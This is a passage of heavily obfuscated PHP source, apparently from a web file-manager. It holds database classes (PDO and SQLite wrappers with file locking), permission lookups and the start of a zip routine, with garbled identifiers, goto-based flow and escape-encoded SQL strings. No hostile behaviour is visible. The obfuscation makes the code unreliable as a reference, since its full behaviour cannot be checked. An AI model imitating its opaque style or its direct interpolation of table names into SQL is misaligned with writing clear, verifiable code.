($Eµ•ĞÉœäâ >= $Fîóœè±íè) { $Fîóœè±íè = $Eµ•ĞÉœäâ; $BÏ¨ÀáÛİ = $FÊ…é­Ÿ­; } } else { if ($fÈì„äÜ˜ == $DÍ…Ğ‰Çİ[463]) { $déùÊá¤ = !0; $B’éĞ†æ”Ö = $FÊ…é­Ÿ­; $Aƒİ¬çì¹½ = $Eµ•ĞÉœäâ; } } } } $f²ÃÊºäèŞ = $AÜ”Åµ‡¾‹ ? $c²©Ëè¦°— : ($B°ò¸ä¨½• ? $Fîóœè±íè : $Aƒİ¬çì¹½); goto fõ£¥Ñİ‚; F ¨‡ö‚½¡: $Aƒİ¬çì¹½ = 0; $eÑ“êª…‘ = 0; $BÏ¨ÀáÛİ = 0; goto a¾éƒãË ; B³ÖíçæÍª: $DÍ…Ğ‰Çİ =& $_SERVER[Ìó]; if (!$E‚ÀŒˆ°ƒ‹) { return array($DÍ…Ğ‰Çİ[373] => 0, $DÍ…Ğ‰Çİ[413] => !1); } $E‘†Øîã¿« = Session::get($DÍ…Ğ‰Çİ[2184]); goto F®‰¥³³õğ; F®‰¥³³õğ: $A‹ôôèé•Š = array_to_keyvalue($E‘†Øîã¿«, $DÍ…Ğ‰Çİ[33], $DÍ…Ğ‰Çİ[2072]); $c²©Ëè¦°— = 0; $Fîóœè±íè = 0; goto F ¨‡ö‚½¡; a¾éƒãË : $B’éĞ†æ”Ö = 0; $AÜ”Åµ‡¾‹ = 0; $B°ò¸ä¨½• = 0; goto f÷Ö½é¿Ü; fõ£¥Ñİ‚: $FÊ…é­Ÿ­ = $AÜ”Åµ‡¾‹ ? $eÑ“êª…‘ : ($B°ò¸ä¨½• ? $BÏ¨ÀáÛİ : $B’éĞ†æ”Ö); $dº„º˜¦’¶ = array($DÍ…Ğ‰Çİ[2228] => intval($f²ÃÊºäèŞ), $DÍ…Ğ‰Çİ[2229] => $FÊ…é­Ÿ­); return $dº„º˜¦’¶; goto F‡èİ‚ Î; F‡èİ‚ Î: } public function authTargetInfoMake($EäÇŠ¢²Ü) { goto fæ’—»ª“Ğ; b÷ëöáğ°: foreach ($EäÇŠ¢²Ü as $B´Ù·‹”°) { if ($B´Ù·‹”°[$B°á”¨¥Ó[367]] == SourceModel::TYPE_USER) { $AĞ‰¤ï”—–[] = intval($B´Ù·‹”°[$B°á”¨¥Ó[451]]); } else { if ($B´Ù·‹”°[$B°á”¨¥Ó[367]] == SourceModel::TYPE_GROUP) { $B¨ã–¿â¢Ô[] = intval($B´Ù·‹”°[$B°á”¨¥Ó[451]]); } } } if ($AĞ‰¤ï”—–) { $AĞ‰¤ï”—– = Model($B°á”¨¥Ó[469])->userListInfo($AĞ‰¤ï”—–); } if ($B¨ã–¿â¢Ô) { $E…¿áƒ¤ = array($B°á”¨¥Ó[2144] => array($B°á”¨¥Ó[380], $B¨ã–¿â¢Ô)); $B¨ã–¿â¢Ô = Model($B°á”¨¥Ó[453])->field($B°á”¨¥Ó[2157])->where($E…¿áƒ¤)->select(); $B¨ã–¿â¢Ô = array_to_keyvalue($B¨ã–¿â¢Ô, $B°á”¨¥Ó[2072]); } goto bÃèƒ–‘¬; fæ’—»ª“Ğ: $B°á”¨¥Ó =& $_SERVER[Ìó]; $AĞ‰¤ï”—– = array(); $B¨ã–¿â¢Ô = array(); goto b÷ëöáğ°; bÃèƒ–‘¬: return array($B°á”¨¥Ó[2233] => $AĞ‰¤ï”—–, $B°á”¨¥Ó[2234] => $B¨ã–¿â¢Ô); goto bŒèÚ—äŠ±; bŒèÚ—äŠ±: } private function authInfo($DÜ„ÌÖê¶–) { $CÑ¾—›ˆÑ× =& $_SERVER[Ìó]; if ($DÜ„ÌÖê¶–[$CÑ¾—›ˆÑ×[2200]]) { $dó©‹îá¸ñ = Model($CÑ¾—›ˆÑ×[2219])->listData($DÜ„ÌÖê¶–[$CÑ¾—›ˆÑ×[2200]]); if (!$dó©‹îá¸ñ) { return !1; $C£·‘—Â¼ã = Model($CÑ¾—›ˆÑ×[2219])->listData(); $fóÀæó¬âå = array_filter_by_field($C£·‘—Â¼ã, $CÑ¾—›ˆÑ×[372], $CÑ¾—›ˆÑ×[463]); return $fóÀæó¬âå; } $c´äÉ½Ò§¥ = array_field_key($dó©‹îá¸ñ, array($CÑ¾—›ˆÑ×[363], $CÑ¾—›ˆÑ×[28], $CÑ¾—›ˆÑ×[372], $CÑ¾—›ˆÑ×[2090], $CÑ¾—›ˆÑ×[2093])); $c´äÉ½Ò§¥[$CÑ¾—›ˆÑ×[2235]] = $DÜ„ÌÖê¶–; return $c´äÉ½Ò§¥; } else { return array($CÑ¾—›ˆÑ×[381] => 0, $CÑ¾—›ˆÑ×[2078] => $DÜ„ÌÖê¶–[$CÑ¾—›ˆÑ×[2201]], $CÑ¾—›ˆÑ×[382] => $CÑ¾—›ˆÑ×[33], $CÑ¾—›ˆÑ×[2090] => $CÑ¾—›ˆÑ×[2236]); } } } goto Eà¼í˜õª¬; E¶ªš Ñõ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F°º Ôƒê = '') { $f•µá¸í¯À =& $_SERVER[Ìó]; if (!class_exists($f•µá¸í¯À[824])) { think_exception(think_lang($f•µá¸í¯À[10]) . $f•µá¸í¯À[825]); } if (!empty($F°º Ôƒê)) { $this->config = $F°º Ôƒê; if (empty($this->config[$f•µá¸í¯À[13]])) { $this->config[$f•µá¸í¯À[13]] = array(); } } } public function connect($CƒÔá”§ƒ = '', $EöŠ—ø„¸ñ = 0) { $BŸ÷ÑÉÙå =& $_SERVER[Ìó]; if (!isset($this->linkID[$EöŠ—ø„¸ñ])) { goto cøÆÉ†Ğ’Í; f²éÖäçÄŞ: $this->linkID[$EöŠ—ø„¸ñ]->exec($BŸ÷ÑÉÙå[835] . think_config($BŸ÷ÑÉÙå[802])); $this->connected = !0; if (1 != think_config($BŸ÷ÑÉÙå[18])) { unset($this->config); } goto CÂ¾æ¼Š¦º; cøÆÉ†Ğ’Í: if (empty($CƒÔá”§ƒ)) { $CƒÔá”§ƒ = $this->config; } if ($this->pconnect) { $CƒÔá”§ƒ[$BŸ÷ÑÉÙå[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$EöŠ—ø„¸ñ] = new PDO($CƒÔá”§ƒ[$BŸ÷ÑÉÙå[826]], $CƒÔá”§ƒ[$BŸ÷ÑÉÙå[799]], $CƒÔá”§ƒ[$BŸ÷ÑÉÙå[800]], $CƒÔá”§ƒ[$BŸ÷ÑÉÙå[13]]); } catch (PDOException $døÆŸà¯ˆ) { think_exception($døÆŸà¯ˆ->getMessage()); } goto B÷ïÏ°äà»; B÷ïÏ°äà»: $this->dbType = $this->_getDsnType($CƒÔá”§ƒ[$BŸ÷ÑÉÙå[826]]); if (in_array($this->dbType, array($BŸ÷ÑÉÙå[827], $BŸ÷ÑÉÙå[828], $BŸ÷ÑÉÙå[829], $BŸ÷ÑÉÙå[830]))) { think_exception($BŸ÷ÑÉÙå[831] . $this->dbType . $BŸ÷ÑÉÙå[832] . $this->dbType . $BŸ÷ÑÉÙå[833]); } if (!$this->linkID[$EöŠ—ø„¸ñ]) { think_exception($BŸ÷ÑÉÙå[834]); } goto f²éÖäçÄŞ; CÂ¾æ¼Š¦º: } return $this->linkID[$EöŠ—ø„¸ñ]; } public function free() { $this->PDOStatement = null; } public function query($a±†Ã¢Ó¯Ÿ, $d„Å©ñŞ = array()) { goto fğïÉè¿ÚÜ; eøÛºÆ½óå: if (!1 === $EìøÈ·ĞÈä) { $this->error(); return !1; } else { return $this->getAll(); } goto FõÍ¸‰â‹è; E¶§†ñ±—Ò: $this->queryStr = $a±†Ã¢Ó¯Ÿ; if (!empty($d„Å©ñŞ)) { $this->queryStr .= $cÍ¦™Á„Ğ™[836] . print_r($d„Å©ñŞ, !0) . $cÍ¦™Á„Ğ™[837]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BçáëˆŠ¦´; a‡Ü¸ÜŒâ´: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $EìøÈ·ĞÈä = $this->PDOStatement->execute($d„Å©ñŞ); $this->debug(); goto eøÛºÆ½óå; fğïÉè¿ÚÜ: $cÍ¦™Á„Ğ™ =& $_SERVER[Ìó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¶§†ñ±—Ò; BçáëˆŠ¦´: think_action_status($cÍ¦™Á„Ğ™[19], 1); think_status($cÍ¦™Á„Ğ™[20]); $this->PDOStatement = $this->_linkID->prepare($a±†Ã¢Ó¯Ÿ); goto a‡Ü¸ÜŒâ´; FõÍ¸‰â‹è: } public function execute($b¾Å¿­å×, $báÂ×äöªë = array()) { goto d¤Ş¡‚Šø; a‹ÒÕÌîâŒ: if ($this->dbType == $Eø‰™„±¯[830]) { if (preg_match($Eø‰™„±¯[838], $this->queryStr, $F¤Ø‹ôªÕÌ)) { $this->table = think_config($Eø‰™„±¯[839]) . str_ireplace(think_config($Eø‰™„±¯[840]), $Eø‰™„±¯[357], $F¤Ø‹ôªÕÌ[2]); $EìùÎÍƒÎô = (bool) $this->query($Eø‰™„±¯[841] . strtoupper($this->table) . $Eø‰™„±¯[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Eø‰™„±¯[21], 1); goto fÒ˜Ù˜«Ì; c¤ŒŠ±³Ëê: $this->queryStr = $b¾Å¿­å×; if (!empty($báÂ×äöªë)) { $this->queryStr .= $Eø‰™„±¯[836] . print_r($báÂ×äöªë, !0) . $Eø‰™„±¯[837]; } $EìùÎÍƒÎô = !1; goto a‹ÒÕÌîâŒ; d¤Ş¡‚Šø: $Eø‰™„±¯ =& $_SERVER[Ìó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¤ŒŠ±³Ëê; a¤ÔÂ…»: $BÂÉºÍ™š¯ = $this->PDOStatement->execute($báÂ×äöªë); $this->debug(); if (!1 === $BÂÉºÍ™š¯) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($EìùÎÍƒÎô || preg_match($Eø‰™„±¯[842], $b¾Å¿­å×)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto BˆÚ¡¹—óË; fÒ˜Ù˜«Ì: think_status($Eø‰™„±¯[20]); $this->PDOStatement = $this->_linkID->prepare($b¾Å¿­å×); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a¤ÔÂ…»; BˆÚ¡¹—óË: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a˜ø›ØˆÕ½ = $this->_linkID->commit(); $this->transTimes = 0; if (!$a˜ø›ØˆÕ½) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a…›ªé± = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a…›ªé±) { $this->error(); return !1; } } return !0; } private function getAll() { $C¼ÍœŞæĞÚ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($C¼ÍœŞæĞÚ); return $C¼ÍœŞæĞÚ; } public function getFields($fäÄÔŠ¬¿é) { goto ağ–¼‰“±ó; a‹‰ŠĞŒ“: $AÑ–©ËË« = $this->query($cÆ—­ƒ©®); $bõ¾‹ºßÑÖ = array(); if ($AÑ–©ËË«) { foreach ($AÑ–©ËË« as $D’±ßÑ• => $B®îÃ¸Ë´) { $B®îÃ¸Ë´ = array_change_key_case($B®îÃ¸Ë´); $B®îÃ¸Ë´[$DôôÔµÌ[28]] = isset($B®îÃ¸Ë´[$DôôÔµÌ[28]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[28]] : $DôôÔµÌ[357]; $B®îÃ¸Ë´[$DôôÔµÌ[29]] = isset($B®îÃ¸Ë´[$DôôÔµÌ[29]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[29]] : $DôôÔµÌ[357]; $føÑá‰îÊÚ = isset($B®îÃ¸Ë´[$DôôÔµÌ[257]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[257]] : $B®îÃ¸Ë´[$DôôÔµÌ[28]]; $bõ¾‹ºßÑÖ[$føÑá‰îÊÚ] = array($DôôÔµÌ[28] => $føÑá‰îÊÚ, $DôôÔµÌ[29] => $B®îÃ¸Ë´[$DôôÔµÌ[29]], $DôôÔµÌ[31] => (bool) (isset($B®îÃ¸Ë´[$DôôÔµÌ[99]]) && $B®îÃ¸Ë´[$DôôÔµÌ[99]] === $DôôÔµÌ[33] || isset($B®îÃ¸Ë´[$DôôÔµÌ[31]]) && $B®îÃ¸Ë´[$DôôÔµÌ[31]] === $DôôÔµÌ[33]), $DôôÔµÌ[34] => isset($B®îÃ¸Ë´[$DôôÔµÌ[34]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[34]] : (isset($B®îÃ¸Ë´[$DôôÔµÌ[53]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[53]] : $DôôÔµÌ[357]), $DôôÔµÌ[36] => isset($B®îÃ¸Ë´[$DôôÔµÌ[89]]) ? strtolower($B®îÃ¸Ë´[$DôôÔµÌ[89]]) == $DôôÔµÌ[38] : (isset($B®îÃ¸Ë´[$DôôÔµÌ[54]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[54]] : !1), $DôôÔµÌ[39] => isset($B®îÃ¸Ë´[$DôôÔµÌ[859]]) ? strtolower($B®îÃ¸Ë´[$DôôÔµÌ[859]]) == $DôôÔµÌ[41] : (isset($B®îÃ¸Ë´[$DôôÔµÌ[89]]) ? $B®îÃ¸Ë´[$DôôÔµÌ[89]] : !1)); } } goto aÏÅ¤Ÿ‚‚÷; ağ–¼‰“±ó: $DôôÔµÌ =& $_SERVER[Ìó]; $this->initConnect(!0); if (think_config($DôôÔµÌ[843])) { $cÆ—­ƒ©® = str_replace($DôôÔµÌ[844], $fäÄÔŠ¬¿é, think_config($DôôÔµÌ[843])); } else { switch ($this->dbType) { case $DôôÔµÌ[827]: case $DôôÔµÌ[845]: $cÆ—­ƒ©® = "\x53\105\114\105\x43\x54\40\40\40\x63\157\154\165\155\156\x5f\x6e\141\155\x65\x20\141\163\x20\x27\116\141\155\x65\x27\54\x20\40\40\144\x61\x74\x61\x5f\164\171\160\x65\x20\x61\163\x20\x27\x54\x79\160\x65\47\54\40\x20\40\143\157\154\165\155\156\137\144\x65\x66\141\165\154\x74\x20\141\x73\x20\47\x44\145\x66\141\x75\x6c\164\x27\54\40\40\40\x69\163\137\156\165\154\x6c\x61\142\154\x65\x20\x61\x73\x20\x27\116\x75\154\154\x27\xa\x9\x9\106\122\x4f\115\11\x69\x6e\x66\x6f\162\x6d\x61\x74\151\x6f\156\137\x73\x63\x68\x65\x6d\x61\x2e\x74\x61\x62\154\145\163\40\101\123\40\x74\12\x9\x9\112\117\x49\x4e\11\151\156\146\157\162\155\x61\164\151\x6f\156\137\x73\143\x68\x65\x6d\x61\56\x63\157\x6c\165\155\x6e\x73\40\101\123\x20\143\12\x9\x9\x4f\116\x20\x20\164\56\x74\141\142\x6c\x65\x5f\143\x61\x74\141\154\x6f\x67\40\x3d\40\x63\x2e\164\141\x62\x6c\145\137\x63\141\164\141\154\x6f\x67\12\11\x9\x41\x4e\104\x20\164\56\164\x61\142\x6c\145\137\x73\x63\150\145\155\x61\x20\75\40\143\x2e\164\x61\x62\154\145\x5f\163\x63\x68\x65\x6d\141\xa\11\11\x41\116\104\x20\x74\x2e\164\x61\142\x6c\x65\x5f\156\141\155\x65\x20\75\40\x63\x2e\x74\141\142\154\145\x5f\156\x61\x6d\x65\12\11\x9\x57\110\x45\x52\x45\40\x20\x20\x74\x2e\164\x61\x62\154\x65\137\x6e\141\x6d\x65\x20\75\40\47{$fäÄÔŠ¬¿é}\x27"; break; case $DôôÔµÌ[846]: $cÆ—­ƒ©® = $DôôÔµÌ[847] . $fäÄÔŠ¬¿é . $DôôÔµÌ[848]; break; case $DôôÔµÌ[828]: case $DôôÔµÌ[830]: $cÆ—­ƒ©® = $DôôÔµÌ[849] . $DôôÔµÌ[850] . $DôôÔµÌ[851] . strtoupper($fäÄÔŠ¬¿é) . $DôôÔµÌ[852] . strtoupper($fäÄÔŠ¬¿é) . $DôôÔµÌ[853]; break; case $DôôÔµÌ[854]: $cÆ—­ƒ©® = $DôôÔµÌ[855] . $fäÄÔŠ¬¿é . $DôôÔµÌ[856]; break; case $DôôÔµÌ[829]: break; case $DôôÔµÌ[857]: default: $cÆ—­ƒ©® = $DôôÔµÌ[858] . ($this->dbType == $DôôÔµÌ[857] ? "\140{$fäÄÔŠ¬¿é}\140" : $fäÄÔŠ¬¿é); } } goto a‹‰ŠĞŒ“; aÏÅ¤Ÿ‚‚÷: return $bõ¾‹ºßÑÖ; goto FŞÆÀÇÇ¿ƒ; FŞÆÀÇÇ¿ƒ: } public function getTables($eÒŞ²¹Ì· = '') { $a·œÁº²—… =& $_SERVER[Ìó]; if (think_config($a·œÁº²—…[860])) { $b¼…È³ÅÉ• = str_replace($a·œÁº²—…[861], $eÒŞ²¹Ì·, think_config($a·œÁº²—…[860])); } else { switch ($this->dbType) { case $a·œÁº²—…[828]: case $a·œÁº²—…[830]: $b¼…È³ÅÉ• = $a·œÁº²—…[862]; break; case $a·œÁº²—…[827]: case $a·œÁº²—…[845]: $b¼…È³ÅÉ• = $a·œÁº²—…[863]; break; case $a·œÁº²—…[854]: $b¼…È³ÅÉ• = $a·œÁº²—…[864]; break; case $a·œÁº²—…[829]: think_exception(think_lang($a·œÁº²—…[865]) . $a·œÁº²—…[866]); break; case $a·œÁº²—…[846]: $b¼…È³ÅÉ• = $a·œÁº²—…[42] . $a·œÁº²—…[43] . $a·œÁº²—…[44]; break; case $a·œÁº²—…[857]: default: if (!empty($eÒŞ²¹Ì·)) { $b¼…È³ÅÉ• = $a·œÁº²—…[810] . $eÒŞ²¹Ì·; } else { $b¼…È³ÅÉ• = $a·œÁº²—…[811]; } } } $D«¦ÀÒÛÎ§ = $this->query($b¼…È³ÅÉ•); $B‰ª¸¾ğˆƒ = array(); foreach ($D«¦ÀÒÛÎ§ as $EÑö—é½·° => $bÍó„‘¥©) { $B‰ª¸¾ğˆƒ[$EÑö—é½·°] = current($bÍó„‘¥©); } return $B‰ª¸¾ğˆƒ; } protected function parseLimit($E÷ØõùÔ—ğ) { $AùÓïÙÕÌó =& $_SERVER[Ìó]; $EÏ…”²¹Íë = $AùÓïÙÕÌó[33]; if (!empty($E÷ØõùÔ—ğ)) { switch ($this->dbType) { case $AùÓïÙÕÌó[854]: case $AùÓïÙÕÌó[846]: $E÷ØõùÔ—ğ = explode($AùÓïÙÕÌó[47], $E÷ØõùÔ—ğ); if (count($E÷ØõùÔ—ğ) > 1) { $EÏ…”²¹Íë .= $AùÓïÙÕÌó[48] . $E÷ØõùÔ—ğ[1] . $AùÓïÙÕÌó[49] . $E÷ØõùÔ—ğ[0] . $AùÓïÙÕÌó[50]; } else { $EÏ…”²¹Íë .= $AùÓïÙÕÌó[48] . $E÷ØõùÔ—ğ[0] . $AùÓïÙÕÌó[50]; } break; case $AùÓïÙÕÌó[827]: case $AùÓïÙÕÌó[845]: break; case $AùÓïÙÕÌó[829]: break; case $AùÓïÙÕÌó[828]: case $AùÓïÙÕÌó[830]: break; case $AùÓïÙÕÌó[857]: default: $EÏ…”²¹Íë .= $AùÓïÙÕÌó[48] . $E÷ØõùÔ—ğ . $AùÓïÙÕÌó[50]; } } return $EÏ…”²¹Íë; } public function parseKey(&$f¸äñËëÃÓ, $cïÌÎæøŒ = true) { $DÕí—«Ä¤ =& $_SERVER[Ìó]; if ($cïÌÎæøŒ) { $f¸äñËëÃÓ = $this->parseKeyCheck($f¸äñËëÃÓ); } if ($this->dbType == $DÕí—«Ä¤[857]) { if ($f¸äñËëÃÓ != $DÕí—«Ä¤[172] && !preg_match($DÕí—«Ä¤[821], $f¸äñËëÃÓ)) { $f¸äñËëÃÓ = $DÕí—«Ä¤[822] . trim($f¸äñËëÃÓ, $DÕí—«Ä¤[822]) . $DÕí—«Ä¤[822]; } return $f¸äñËëÃÓ; } else { return parent::parseKey($f¸äñËëÃÓ); } } public function close() { $this->_linkID = null; } public function error() { $A‰êØ¼ÌÒÏ =& $_SERVER[Ìó]; if ($this->PDOStatement) { $eÅó«óÛÅõ = $this->PDOStatement->errorInfo(); $this->error = $eÅó«óÛÅõ[1] . $A‰êØ¼ÌÒÏ[4] . $eÅó«óÛÅõ[2]; } else { $this->error = $A‰êØ¼ÌÒÏ[33]; } if ($A‰êØ¼ÌÒÏ[33] != $this->queryStr) { $this->error .= LNG($A‰êØ¼ÌÒÏ[45]) . $this->queryStr; } think_trace($this->error, $A‰êØ¼ÌÒÏ[33], $A‰êØ¼ÌÒÏ[46]); return $this->error; } public function escapeString($e…¬Ğ–“¤£) { $EÜøĞŠÎ—‹ =& $_SERVER[Ìó]; switch ($this->dbType) { case $EÜøĞŠÎ—‹[854]: case $EÜøĞŠÎ—‹[827]: case $EÜøĞŠÎ—‹[845]: case $EÜøĞŠÎ—‹[857]: return addslashes($e…¬Ğ–“¤£); case $EÜøĞŠÎ—‹[829]: case $EÜøĞŠÎ—‹[846]: case $EÜøĞŠÎ—‹[828]: case $EÜøĞŠÎ—‹[830]: return str_ireplace($EÜøĞŠÎ—‹[55], $EÜøĞŠÎ—‹[56], $e…¬Ğ–“¤£); } } protected function parseValue($fä²²—¥§À) { $d„ôâ®˜Ò =& $_SERVER[Ìó]; if (is_string($fä²²—¥§À)) { $fä²²—¥§À = strpos($fä²²—¥§À, $d„ôâ®˜Ò[4]) === 0 ? $this->escapeString($fä²²—¥§À) : $d„ôâ®˜Ò[867] . $this->escapeString($fä²²—¥§À) . $d„ôâ®˜Ò[867]; } elseif (isset($fä²²—¥§À[0]) && is_string($fä²²—¥§À[0]) && strtolower($fä²²—¥§À[0]) == $d„ôâ®˜Ò[281]) { $fä²²—¥§À = $this->escapeString($fä²²—¥§À[1]); } elseif (is_array($fä²²—¥§À)) { $fä²²—¥§À = array_map(array($this, $d„ôâ®˜Ò[868]), $fä²²—¥§À); } elseif (is_bool($fä²²—¥§À)) { $fä²²—¥§À = $fä²²—¥§À ? $d„ôâ®˜Ò[83] : $d„ôâ®˜Ò[463]; } elseif (is_null($fä²²—¥§À)) { $fä²²—¥§À = $d„ôâ®˜Ò[99]; } return $fä²²—¥§À; } public function getLastInsertId() { $dó¢Ì¸ =& $_SERVER[Ìó]; switch ($this->dbType) { case $dó¢Ì¸[854]: case $dó¢Ì¸[846]: case $dó¢Ì¸[827]: case $dó¢Ì¸[845]: case $dó¢Ì¸[829]: case $dó¢Ì¸[857]: return $this->_linkID->lastInsertId(); case $dó¢Ì¸[828]: case $dó¢Ì¸[830]: $aåíÅè…¦‹ = $this->table; $aÎ°õîàîç = $this->query("\123\x45\x4c\x45\103\x54\40{$aåíÅè…¦‹}\x2e\x63\x75\x72\162\x76\141\x6c\x20\143\165\162\162\166\x61\x6c\x20\106\122\117\115\40\144\x75\141\154"); return $aÎ°õîàîç ? $aÎ°õîàîç[0][$dó¢Ì¸[869]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($F‡ªê¹‹İ) { goto e–‹Ù†­¾É; e–‹Ù†­¾É: $c¤âåßí…¬ =& $_SERVER[Ìó]; $a‘Ê£¦á‰« = DATA_PATH . $c¤âåßí…¬[870]; $bòğ™à·Ò½ = fopen($a‘Ê£¦á‰«, $c¤âåßí…¬[871]); goto Bìì‹÷©Æ; Bìì‹÷©Æ: if (!$bòğ™à·Ò½) { return !1; } if (flock($bòğ™à·Ò½, LOCK_EX)) { $b–‡ìÊ‘¾˜ = parent::query($F‡ªê¹‹İ); flock($bòğ™à·Ò½, LOCK_UN); fclose($bòğ™à·Ò½); return $b–‡ìÊ‘¾˜; } flock($bòğ™à·Ò½, LOCK_UN); goto E‹´é¿£; E‹´é¿£: fclose($bòğ™à·Ò½); show_json($c¤âåßí…¬[872], !1); return !1; goto aßù¢š‚Å¾; aßù¢š‚Å¾: } public function execute($CÑ“¿ÜÇ¾Ü) { goto bè£°Ôí§Ã; DœÊ‰ù¾áÉ: if (!$F×Šº…ºá) { return !1; } if (flock($F×Šº…ºá, LOCK_EX)) { $cİ ğŞïÒ± = parent::execute($CÑ“¿ÜÇ¾Ü); flock($F×Šº…ºá, LOCK_UN); fclose($F×Šº…ºá); return $cİ ğŞïÒ±; } flock($F×Šº…ºá, LOCK_UN); goto AèèË†£ò¤; AèèË†£ò¤: fclose($F×Šº…ºá); show_json($A¼øä˜ç¦[872], !1); return !1; goto CÑŒ’†¿ë; bè£°Ôí§Ã: $A¼øä˜ç¦ =& $_SERVER[Ìó]; $d¼™¨½ëÊ‘ = DATA_PATH . $A¼øä˜ç¦[870]; $F×Šº…ºá = fopen($d¼™¨½ëÊ‘, $A¼øä˜ç¦[871]); goto DœÊ‰ù¾áÉ; CÑŒ’†¿ë: } } class DbSqlite3 extends DbSqlite3Base { public function query($EÉ‹Ã¾£õ¥) { goto DŒ±¬¨ÕÛô; Eù‰âÃİ‡Ş: if (!$AÖ‹É‹¼è…) { return !1; } if (flock($AÖ‹É‹¼è…, LOCK_EX)) { $A½†Ü ÷ÅÈ = parent::query($EÉ‹Ã¾£õ¥); flock($AÖ‹É‹¼è…, LOCK_UN); fclose($AÖ‹É‹¼è…); return $A½†Ü ÷ÅÈ; } flock($AÖ‹É‹¼è…, LOCK_UN); goto Eø­©Œ“Ó; Eø­©Œ“Ó: fclose($AÖ‹É‹¼è…); show_json($e·æÔŒÔ±[872], !1); return !1; goto Dç±ôÃ¨‹Ï; DŒ±¬¨ÕÛô: $e·æÔŒÔ± =& $_SERVER[Ìó]; $EÍ©çÍìàì = DATA_PATH . $e·æÔŒÔ±[870]; $AÖ‹É‹¼è… = fopen($EÍ©çÍìàì, $e·æÔŒÔ±[871]); goto Eù‰âÃİ‡Ş; Dç±ôÃ¨‹Ï: } public function execute($Cêù†á¹é) { goto FÙ’ŠÜ×“§; d É„Âğ‰é: if (!$DÄõ¼¢‹ƒµ) { return !1; } if (flock($DÄõ¼¢‹ƒµ, LOCK_EX)) { $FÙòçí®÷ì = parent::execute($Cêù†á¹é); flock($DÄõ¼¢‹ƒµ, LOCK_UN); fclose($DÄõ¼¢‹ƒµ); return $FÙòçí®÷ì; } flock($DÄõ¼¢‹ƒµ, LOCK_UN); goto Aöäø‹‚½; Aöäø‹‚½: fclose($DÄõ¼¢‹ƒµ); show_json($a“‚ì°¶óğ[872], !1); return !1; goto F÷ÕÕÈŞ¯Ã; FÙ’ŠÜ×“§: $a“‚ì°¶óğ =& $_SERVER[Ìó]; $bò£§Ğ¿› = DATA_PATH . $a“‚ì°¶óğ[870]; $DÄõ¼¢‹ƒµ = fopen($bò£§Ğ¿›, $a“‚ì°¶óğ[871]); goto d É„Âğ‰é; F÷ÕÕÈŞ¯Ã: } } goto d„²ëÍÁâ; CäŒ á™¦: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $dê²Üáƒï; if (!$dê²Üáƒï) { $f‡ŸóÙ®Ö = IO::init($_SERVER[Ìó][8]); } return $f‡ŸóÙ®Ö; } private static function iconvSystem($cßÔòĞ‰Š) { return self::local()->iconvSystem($cßÔòĞ‰Š); } private static function iconvApp($A­õ¨‰‹º) { return self::local()->iconvApp($A­õ¨‰‹º); } public static function zip($e‰ßØÎ¹‡«, $a±æ¸Ùô©ç = "\172\x69\x70", $E®´‰±Ğà­ = '', $DñÜ‡×ë¼ = REPEAT_RENAME) { goto AÙ¥ï¹ƒ‡°; B Æİ ŠÀˆ: if ($E®´‰±Ğà­ || !$då³ÀŠâ™ñ) { if ($då³ÀŠâ™ñ && strstr($då³ÀŠâ™ñ, TEMP_FILES)) { $a½¼Êì–İ = $bô¯Íñ‹ÙÏ = array(); recursion_dir($A™Ä—Û¾¨, $a½¼Êì–İ, $bô¯Íñ‹ÙÏ, 0); foreach ($a½¼Êì–İ as $Fì“íääÅ) { del_dir($Fì“íääÅ); } foreach ($bô¯Íñ‹ÙÏ as $d’—¦ÕÙ“) { if ($d’—¦ÕÙ“ == $BÉÒ¯Ú¿) { continue; } del_file($d’—¦ÕÙ“); } } return $Aˆ×Æí‡¬†; } $aÀÁ»‘’™ì = self::pathFather($EëØ´òÜÍä[$c™‡´°¶‡[75]]); $F«‘¢¦£Ò = self::move($Aˆ×Æí‡¬†, $aÀÁ»‘’™ì, $DñÜ‡×ë¼); goto Bòã—‰”ÕŠ; Cáç“½¶õì: $då³ÀŠâ™ñ = !1; if (!$E®´‰±Ğà­ && $b±‚÷ì¼Šˆ->getType() == $c™‡´°¶‡[101]) { $bô¯Íñ‹ÙÏ = self::zipFileList($e‰ßØÎ¹‡«); } else { $då³ÀŠâ™ñ = $E®´‰±Ğà­ ? $E®´‰±Ğà­ : TEMP_FILES . $c™‡´°¶‡[1021] . time() . rand_string(8) . $c™‡´°¶‡[8]; mk_dir($då³ÀŠâ™ñ); $bô¯Íñ‹ÙÏ = self::zipFileList($e‰ßØÎ¹‡«, $då³ÀŠâ™ñ); } $eÜƒğòƒË = $EëØ´òÜÍä[$c™‡´°¶‡[28]]; goto B½„»ÈÈ; AÙ¥ï¹ƒ‡°: $c™‡´°¶‡ =& $_SERVER[Ìó]; $b±‚÷ì¼Šˆ = self::init($e‰ßØÎ¹‡«[0][$c™‡´°¶‡[75]]); $EëØ´òÜÍä = self::info($e‰ßØÎ¹‡«[0][$c™‡´°¶‡[75]]); goto Cáç“½¶õì; DÔÁ­®†£­: $Aˆ×Æí‡¬† = $A™Ä—Û¾¨ . $eÜƒğòƒË . $c™‡´°¶‡[91] . $a±æ¸Ùô©ç; $Aˆ×Æí‡¬† = 